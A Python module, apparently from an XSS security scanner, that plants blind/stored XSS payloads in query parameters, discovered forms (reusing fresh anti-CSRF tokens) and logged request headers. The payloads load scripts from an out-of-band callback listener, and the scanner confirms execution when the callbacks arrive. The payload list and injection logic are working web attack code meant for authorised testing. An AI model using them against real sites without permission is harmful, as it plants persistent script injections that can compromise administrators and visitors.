from __future__ import annotations

import time
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

from xsscane.core.csrf import CsrfManager
from xsscane.core.models import Confidence, Finding, Severity
from xsscane.core.oast import OastServer, OastSession
from xsscane.modules.base import BaseScanner

# Probes that load a resource from the OAST listener. They cover the HTML body,
# attribute breakouts (single/double quote) and a bare img — between them they fire
# in most reflection/storage contexts when a victim later renders the payload.
_PAYLOADS = [
    "\"><script src=//{cb}></script>",
    "'><script src=//{cb}></script>",
    "<script src=//{cb}></script>",
    "\"><img src=//{cb}>",
    "<img src=//{cb}>",
]

# Request headers that are frequently logged and later rendered in an admin panel
# (the classic blind-XSS vector). One script probe each is enough.
_HEADERS = ("User-Agent", "Referer", "X-Forwarded-For")


class BlindXssScanner(BaseScanner):
    """Out-of-band (blind/stored) XSS. Injects payloads that load a uniquely-tokenised
    resource from a self-hosted OAST listener when the stored input is later rendered;
    a received callback confirms execution that never shows in the HTTP response."""

    name = "blind"

    def scan(self) -> list[Finding]:
        if not self.config.oast_url:
            self.log.warning(
                "[warning]Blind XSS needs --oast-url (a callback base URL the target can reach); skipping[/]"
            )
            return []

        host, port = self._listen_address()
        server = OastServer(host, port, self.log)
        if not server.start():
            return []

        session = OastSession(self.config.oast_url, server)
        self._csrf = CsrfManager(self.http, self.log)
        registry: dict[str, dict] = {}
        try:
            probes = self._inject_all(session, registry)
            if not probes:
                self.log.info("[muted]No injectable points for blind scan[/]")
                return []
            self.log.info(
                f"[info]Blind XSS: planted {probes} probe(s); waiting "
                f"{self.config.oast_wait:.0f}s for out-of-band callbacks...[/]"
            )
            time.sleep(self.config.oast_wait)
            findings = self._correlate(server, registry)
            self.log.info(f"[info]OAST: {server.total} interaction(s) received[/]")
            return findings
        finally:
            server.stop()

    # -- injection ------------------------------------------------------------

    def _inject_all(self, session: OastSession, registry: dict) -> int:
        planted = 0
        # URL query parameters / supplied POST body
        for name, method in self._injection_points():
            base = dict(parse_qsl(self.config.data or "")) if method == "POST" else {}
            planted += self._inject_field(session, registry, self.config.url, method, base, name)
        # Forms discovered on the page (comments, feedback, profile, ...), carrying
        # their hidden anti-CSRF tokens so a protected endpoint accepts the probe.
        for form in self._csrf.forms(self.config.url):
            for name in form["text_fields"]:
                planted += self._inject_form(session, registry, form, name)
        # Reflected/stored request headers
        for header in _HEADERS:
            planted += self._inject_header(session, registry, header)
        return planted

    def _inject_field(self, session, registry, url, method, base_fields, name) -> int:
        count = 0
        for template in _PAYLOADS:
            token = session.token()
            payload = template.format(cb=session.callback(token))
            registry[token] = {"url": url, "location": name, "payload": payload, "method": method}
            fields = dict(base_fields)
            fields[name] = payload
            self._send(url, method, fields)
            count += 1
        return count

    def _inject_form(self, session, registry, form, name) -> int:
        count = 0
        for template in _PAYLOADS:
            token = session.token()
            payload = template.format(cb=session.callback(token))
            registry[token] = {"url": form["action"], "location": name,
                               "payload": payload, "method": form["method"]}
            # Refresh the token per submission so single-use CSRF tokens stay valid.
            hidden = (self._csrf.fresh_hidden(self.config.url, form["index"])
                      if form["has_token"] else form["hidden"])
            fields = {**hidden, **form["text_fields"], name: payload}
            self._send(form["action"], form["method"], fields)
            count += 1
        return count

    def _inject_header(self, session, registry, header) -> int:
        token = session.token()
        payload = _PAYLOADS[2].format(cb=session.callback(token))  # bare <script src>
        registry[token] = {"url": self.config.url, "location": f"header:{header}",
                           "payload": payload, "method": "GET"}
        self.http.request("GET", self.config.url, extra_headers={header: payload})
        return 1

    def _send(self, url: str, method: str, fields: dict) -> None:
        if method == "POST":
            self.http.request("POST", url, data=fields)
        else:
            self.http.request("GET", self._merge_query(url, fields))

    # -- correlation ----------------------------------------------------------

    def _correlate(self, server: OastServer, registry: dict) -> list[Finding]:
        findings = []
        reported = set()  # one finding per (url, injection point) is enough
        for token, ctx in registry.items():
            location = (ctx["url"], ctx["location"])
            if location in reported:
                continue
            hits = server.hits(token)
            if hits:
                reported.add(location)
                hit = hits[0]
                findings.append(
                    Finding(
                        self.name, ctx["url"], ctx["location"], ctx["payload"],
                        Severity.HIGH, Confidence.CONFIRMED,
                        f"Out-of-band callback from {hit.remote_ip} "
                        f"({hit.method} {hit.path}) - blind/stored XSS",
                        ctx["method"],
                    )
                )
        return findings

    # -- helpers --------------------------------------------------------------

    def _listen_address(self) -> tuple[str, int]:
        host, _, port = self.config.oast_listen.partition(":")
        return (host or "0.0.0.0"), int(port or "8888")

    @staticmethod
    def _merge_query(url: str, params: dict) -> str:
        parsed = urlparse(url)
        merged = dict(parse_qsl(parsed.query))
        merged.update(params)
        return urlunparse(parsed._replace(query=urlencode(merged)))
